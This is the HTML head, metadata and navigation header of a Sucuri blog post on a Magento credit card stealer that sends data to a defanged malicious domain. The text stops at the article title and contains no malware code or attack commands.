<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CDN-Filestore Credit Card Stealer for Magento</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="CDN-Filestore Credit Card Stealer for Magento" />
<meta property="og:description" content="Our analyst describes a recent evolution of a credit card stealer for Magento that harvests stolen information and sends it to malicious domain. " />
<meta property="og:image" content="https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog.png" />
<meta property="og:url" content="https://blog.sucuri.net/2020/08/cdn-filestore-credit-card-stealer-for-magento.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2020-08-18T12:30:35-07:00" />
<meta property="article:modified_time" content="2020-08-18T12:30:35-07:00" />
<meta property="og:updated_time" content="2020-08-18T12:30:35-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta property="og:image:width" content="745" />
<meta property="og:image:height" content="350" />
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="CDN-Filestore Credit Card Stealer for Magento">
<meta name="twitter:description" content="During a website remediation, we recently discovered a new version of a Magento credit card stealer which sends all compromised data to the malicious domain cdn-filestore[dot]com. My colleague Luke Leal originally wrote about this malware">
<meta name="twitter:image" content="https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog.png">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Our analyst describes a recent evolution of a credit card stealer for Magento that harvests stolen information and sends it to malicious domain."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2020/08/cdn-filestore-credit-card-stealer-for-magento.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"209","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2020\/08\/cdn-filestore-credit-card-stealer-for-magento.html","title":"CDN-Filestore+Credit+Card+Stealer+for+Magento","image":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2019\/12\/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog.png","desc":"During a website remediation, we recently discovered a new version of a Magento credit card stealer which sends all compromised data to the malicious domain cdn-filestore[dot]com. My colleague Luke Leal originally wrote about this malware \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"27060","servertime":"1659523919","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/27060" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=27060' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2020\/08\/cdn-filestore-credit-card-stealer-for-magento.html"},"url":"https:\/\/blog.sucuri.net\/2020\/08\/cdn-filestore-credit-card-stealer-for-magento.html","headline":"CDN-Filestore Credit Card Stealer for Magento","datePublished":"2020-08-18T12:30:35-07:00","dateModified":"2020-08-18T12:30:35-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"image":{"@type":"ImageObject","url":"https:\/\/blog.sucuri.net\/wp-content\/uploads\/2019\/12\/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog.png","width":745,"height":350},"articleSection":"Ecommerce Security","keywords":"Black Hat Tactics, Hacked Websites, Labs Note, Obfuscation","description":"During a website remediation, we recently discovered a new version of a Magento credit card stealer which sends all compromised data to the malicious domain cdn-filestorecom. My colleague Luke Leal originally wrote about this malware in a blog post earlier this year. Malware Evolution &amp; Evasive Techniques One primary","author":{"@type":"Person","name":"Krasimir Konov","url":"https:\/\/blog.sucuri.net\/author\/krasimir","description":"Krasimir Konov is Sucuri's Malware Analyst who joined the company in 2014. Krasimir's main responsibilities include analyzing malicious code, signature creation and documentation of malware. His professional experience covers more than 10 years in the IT field, with nine years involved in IT\/cyber security. When heâ€™s not analyzing malware or writing Labs notes, you might find Krasimir riding his motorcycle and traveling the world. Connect with him on Twitter or LinkedIn.","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/df2487806812cf3a45af64a37a1e0daf?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-27060 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-27060 post type-post status-publish format-standard has-post-thumbnail category-ecommerce-security category-magento-security category-sucuri-labs category-website-malware-infections category-website-security tag-black-hat-tactics tag-hacked-websites tag-labs-note tag-obfuscation entry"><header class="entry-header"><div class="single-featured"><img width="745" height="350" src="https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog-745x350.png" class="single-featured-image wp-post-image" alt="Anatomy of a credit card stealer" loading="lazy" srcset="https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog.png 745w, https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog-600x282.png 600w, https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog-650x305.png 650w, https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog-585x275.png 585w, https://blog.sucuri.net/wp-content/uploads/2019/12/12192019_AnatomyofWebsiteMalwareCCSkimmer_blog-560x263.png 560w" sizes="(max-width: 745px) 100vw, 745px" /></div><h1 class="entry-title">CDN-Filestore Credit Card Stealer for Magento</h1>
